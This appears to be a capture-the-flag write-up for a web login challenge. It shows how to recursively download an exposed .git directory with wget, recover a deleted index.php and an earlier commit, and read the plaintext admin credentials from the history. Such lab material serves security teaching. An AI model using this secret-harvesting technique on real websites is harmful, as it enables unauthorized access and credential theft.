  #### Analysis

  Upon opening the challenge, we are greeted with a login page and the credentials are not given. However, the given hint [leads us](https://stackoverflow.com/a/3082452) to `.git` directory at `http://HOST:PORT/.git/`.  

  ```

  ```

  #### Exploiting

  Now we have a fully accessible `.git` directory. The exposed directory can be recursively cloned using 

  ```bash
  wget -r http://HOST:PORT/.git/ 
  ```

  This command clones all the files in the .git directory to local computer. This cloned directory is a valid git directory and contains all the information about commits, history, remote repository address, etc.

  Upon checking the status of the repository using `git status` command, we find that `index.php` has been deleted. The deleted `index.php` file can be restored with `git restore` command. 

  We can now find the username from `index.php`, however, the password appears to be hashed.

  ```php
  <?php
  $msg = "";

  if(isset($_POST['password'], $_POST['username'])) {
          if(md5($_POST['password']) === "bf639e280ec7f346362c7fa2f00d2ca5" && $_POST['username'] === "system_admin")
          {
                  die($_ENV["the_flag"]);
          }  else {
                  $msg = "Wrong username or password.";
          } 
  }
  ?>
  ```

  Upon checking the commit history with `git log` command, we find there are 3 commits.

  ```

  commit 6e672df7e870349b61df637122b0871816d612f2
  Author: Challenge Author <webm4ster@internal.domain>
  Date:   Tue Dec 28 08:12:42 2021 +0000

      Just getting started
  ```

  We see that there is a commit with ID `8c722b69146bcdca516488e17a76447e44132c7a` that mentions about a security issue that was fixed. 

  We can revert back to the first commit using `git checkout 6e672df7e870349b61df637122b0871816d612f2` command. (Note that the ID given is that of the first commit.)

  Now let us check the source code of `index.php`. This gives us the username and password of the application. 

  ```php
  <?php
  $msg = "";

  if(isset($_POST['password'], $_POST['username'])) {
          if($_POST['password'] === "Ius3UnGu3ssBLEP@s5w0rDs" && $_POST['username'] === "system_admin")
          {
                  die($_ENV["the_flag"]);
          }  else {
                  $msg = "Wrong username or password.";
          } 
  }
  ?>
  ```

  Upon logging in with these credentials, we get the flag.
